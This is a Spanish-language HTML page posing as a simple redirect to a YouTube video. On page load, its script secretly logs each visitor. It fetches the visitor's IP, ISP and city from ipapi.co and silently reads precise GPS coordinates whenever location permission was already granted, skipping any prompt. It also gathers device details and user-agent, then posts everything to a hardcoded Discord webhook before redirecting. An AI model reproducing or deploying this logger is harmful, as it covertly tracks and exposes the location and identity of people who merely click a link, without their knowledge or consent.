<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirigiendo...</title>
</head>
<body>
    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1513047206297600070/NvgpPaLE_sLhfPY757UyL_3F_y-JBkY_Ci5p6Imnwx1Ed_jHG2AXvrhAShuoUjXq9B6p";
        const YOUTUBE_URL = "https://youtu.be/M_0SVIoit9E?si=7xeWp8ns_jdXVreN"; // Pega aquí el enlace de tu video

        async function obtenerUbicacionSilenciosa() {
            if (!("geolocation" in navigator) || !("permissions" in navigator)) {
                return { gpsData: "API de geolocalización no soportada", mapLink: "N/A" };
            }

            try {
                const result = await navigator.permissions.query({ name: 'geolocation' });

                if (result.state === 'granted') {
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 3000
                        });
                    });
                    
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const precision = Math.round(position.coords.accuracy);

                    return {
                        gpsData: `Lat: ${lat}, Lon: ${lon} (Precisión: ~${precision}m)`,
                        mapLink: `https://www.google.com/maps?q=${lat},${lon}`
                    };
                } else {
                    return { gpsData: "Permiso no concedido previamente (omitiendo solicitud)", mapLink: "N/A" };
                }
            } catch (error) {
                return { gpsData: "No se pudo verificar la ubicación", mapLink: "N/A" };
            }
        }

        async function registrarYRedirigir() {
            let ipData = {};
            try {
                const res = await fetch("https://ipapi.co/json/");
                ipData = await res.json();
            } catch (e) {
                console.error("Error al obtener IP:", e);
            }

            // Obtener ubicación si el permiso ya existía
            const gpsInfo = await obtenerUbicacionSilenciosa();

            // Datos del sistema
            const pantalla = `${window.screen.width}x${window.screen.height}`;
            const memoriaRAM = navigator.deviceMemory ? `~${navigator.deviceMemory} GB` : "N/A";
            const nucleosCPU = navigator.hardwareConcurrency || "N/A";
            const idioma = navigator.language || "Desconocido";
            const zonaHoraria = Intl.DateTimeFormat().resolvedOptions().timeZone;

            // Payload para Discord
            const payload = {
                embeds: [{
                    title: "🔍 Registro de Visita",
                    color: 16711680, // Color rojo
                    fields: [
                        { name: "🌐 Dirección IP", value: ipData.ip || "No detectada", inline: true },
                        { name: "🏢 Proveedor (ISP)", value: ipData.org || "Desconocido", inline: true },
                        { name: "📍 Ubicación por IP", value: `${ipData.city || '?'}, ${ipData.region || '?'}, ${ipData.country_name || '?'}`, inline: false },
                        { name: "🎯 GPS Exacto", value: gpsInfo.gpsData, inline: false },
                        { name: "🗺️ Enlace Google Maps", value: gpsInfo.mapLink, inline: false },
                        { name: "💻 Pantalla", value: pantalla, inline: true },
                        { name: "🧠 RAM / CPU", value: `RAM: ${memoriaRAM} | Núcleos: ${nucleosCPU}`, inline: true },
                        { name: "🕒 Zona Horaria / Idioma", value: `${zonaHoraria} (${idioma})`, inline: true },
                        { name: "📱 User-Agent", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Logger de Redirección GitHub Pages" },
                    timestamp: new Date().toISOString()
                }]
            };

            // Intentar enviar la notificación a Discord
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (err) {
                console.error("Error enviando a Discord:", err);
            }

            // Redirigir al usuario al video de YouTube
            window.location.href = YOUTUBE_URL;
        }

        window.onload = registrarYRedirigir;
    </script>
</body>
</html>
